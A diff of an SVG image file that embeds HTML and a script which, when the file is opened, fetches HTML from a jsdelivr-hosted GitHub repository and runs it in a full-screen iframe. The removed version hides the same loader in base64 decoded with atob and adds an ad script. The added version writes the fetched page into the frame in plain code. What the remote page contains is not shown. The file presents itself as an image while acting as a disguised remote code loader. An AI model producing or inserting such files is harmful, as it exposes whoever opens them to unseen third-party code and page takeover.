@@ -1,11 +1,48 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
-<style>[...]</style>
-  <foreignObject x="0" y="0" width="100%" height="100%">
-    <body xmlns="http://www.w3.org/1999/xhtml">
-    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
-	 <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test" srcdoc="&lt;script&gt;&#10;    launch();&#10;&#10;    function launch() {&#10;      try {&#10;        fetch(&quot;https://cdn.jsdelivr.net/gh/freebuisness/freebuisness.github.io@main/singlefile.html?t=&quot;+Date.now())&#10;          .then(response =&gt; response.text())&#10;          .then(html =&gt; {&#10;                document.documentElement.innerHTML = html;&#10;&#10;                document.documentElement.querySelectorAll('script').forEach(oldScript =&gt; {&#10;                    const newScript = document.createElement('script');&#10;                    if (oldScript.src) {&#10;                        newScript.src = oldScript.src;&#10;                    } else {&#10;                        newScript.textContent = oldScript.textContent;&#10;                    }&#10;                    document.body.appendChild(newScript);&#10;                });&#10;          });&#10;      } catch (error) {&#10;        console.error('error:', error);&#10;      }&#10;    }&#10;&#10;  &lt;/script&gt;&#10;  &lt;script async src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5521219086088837&quot;&#10;     crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#10;&#10;&#10;"></iframe>
-         <script>let l = atob("PHNjcmlwdD4KICAgIGxhdW5jaCgpOwoKICAgIGZ1bmN0aW9uIGxhdW5jaCgpIHsKICAgICAgdHJ5IHsKICAgICAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2ZyZWVidWlzbmVzcy9mcmVlYnVpc25lc3MuZ2l0aHViLmlvQG1haW4vc2luZ2xlZmlsZS5odG1sP3Q9IitEYXRlLm5vdygpKQogICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgICAgICAgLnRoZW4oaHRtbCA9PiB7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MID0gaHRtbDsKCiAgICAgICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucXVlcnlTZWxlY3RvckFsbCgnc2NyaXB0JykuZm9yRWFjaChvbGRTY3JpcHQgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnN0IG5ld1NjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgICAgICAgICAgICAgIGlmIChvbGRTY3JpcHQuc3JjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG5ld1NjcmlwdC5zcmMgPSBvbGRTY3JpcHQuc3JjOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG5ld1NjcmlwdC50ZXh0Q29udGVudCA9IG9sZFNjcmlwdC50ZXh0Q29udGVudDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChuZXdTY3JpcHQpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICB9KTsKICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCdlcnJvcjonLCBlcnJvcik7CiAgICAgIH0KICAgIH0KCiAgPC9zY3JpcHQ+CiAgPHNjcmlwdCBhc3luYyBzcmM9Imh0dHBzOi8vcGFnZWFkMi5nb29nbGVzeW5kaWNhdGlvbi5jb20vcGFnZWFkL2pzL2Fkc2J5Z29vZ2xlLmpzP2NsaWVudD1jYS1wdWItNTUyMTIxOTA4NjA4ODgzNyIKICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgo="); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml" width="1061" height="1063" viewBox="0 0 1061 1063">
+  <foreignObject id="fo" width="1061" height="1063" x="0" y="0">
+    <xhtml:html xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;margin:0;padding:0;">
+    <head>
+      <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
+        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
+      </style>
+    </head>
+    <body>
+      <iframe id="fm" src="about:blank"></iframe>
+      <script>
+      //<![CDATA[
+        (function() {
+          function size() {
+            var w = window.innerWidth, h = window.innerHeight;
+            var svg = document.querySelector('svg');
+            var fo  = document.querySelector('foreignObject');
+            if (svg) { svg.setAttribute('width', w); svg.setAttribute('height', h); svg.setAttribute('viewBox','0 0 '+w+' '+h); }
+            if (fo)  { fo.setAttribute('width', w);  fo.setAttribute('height', h); }
+          }
+          size();
+          window.addEventListener('resize', size);
+
+          (async () => {
+            try {
+              const url = 'https://fastly.jsdelivr.net/gh/freebuisness/freebuisness.github.io@main/singlefile.html?t=' + Date.now();
+              const res = await fetch(url);
+              const text = await res.text();
+
+              const frame = document.getElementById('fm');
+              const fdoc = frame.contentDocument || frame.contentWindow.document;
+
+              fdoc.open();
+              fdoc.write(text);
+              fdoc.close();
+            } catch(e) {
+              console.error('Loader error:', e);
+            }
+          })();
+        })();
+      //]]>
+      </script>
     </body>
+    </xhtml:html>
   </foreignObject>
-      <script><![CDATA[...]]></script>
 <script xmlns=""/><link xmlns=""/></svg>
